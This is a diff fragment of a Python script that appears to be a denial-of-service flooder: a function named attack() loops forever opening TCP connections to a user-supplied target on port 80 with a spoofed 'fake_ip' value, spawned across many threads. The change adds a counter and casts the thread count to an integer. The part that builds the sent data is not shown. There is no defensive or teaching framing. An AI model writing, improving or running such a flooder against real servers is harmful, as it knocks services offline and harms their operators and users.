@@ -14,6 +14,8 @@ target = awnser_target
 port = 80
 fake_ip = awnser_fakeip
 
+attack_num = 0
+
 def attack():
     while True:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -27,6 +29,6 @@ def attack():
         
         s.close()
 
-for i in range(answer_threads):
+for i in range(int(awnser_threads)):
     thread = threading.Thread(target=attack)
     thread.start()
